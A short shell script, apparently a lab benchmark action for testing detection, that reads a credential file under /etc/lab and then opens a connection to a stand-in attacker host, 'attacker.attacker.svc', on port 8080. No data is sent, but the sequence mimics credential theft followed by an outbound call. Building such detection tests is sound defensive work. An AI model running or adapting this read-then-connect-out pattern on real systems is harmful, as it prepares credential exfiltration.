#!/bin/sh
# Read the credential file, then connect out: the full sequence.
echo "BENCH_ACTION $(date +%s%3N)"
cat /etc/lab/credentials > /dev/null
python3 -c '
import socket
socket.create_connection(("attacker.attacker.svc", 8080), timeout=5).close()
' && echo CONNECTED
